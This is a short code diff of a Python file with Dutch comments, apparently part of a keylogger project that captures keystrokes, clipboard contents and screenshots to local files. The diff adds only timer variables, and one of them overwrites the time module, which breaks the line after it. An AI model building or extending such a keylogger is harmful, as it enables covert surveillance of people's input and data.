@@ -40,6 +40,12 @@ path_clipboard = str(path_directory).replace("main.py", "clipboard.txt")
 screenshot_info = "screenshot.png"
 path_screenshot = str(path_directory).replace("main.py", "screenshot.png")
 
+# Variabelen voor timer
+iterations = 0
+time = time.time()
+stop_time = time.time() + time_iteration
+
+
 # Functies keylogger
 
 def on_press(key):
@@ -113,4 +119,4 @@ def screenshot():
 
 screenshot()
 
-
+# Functies voor timer
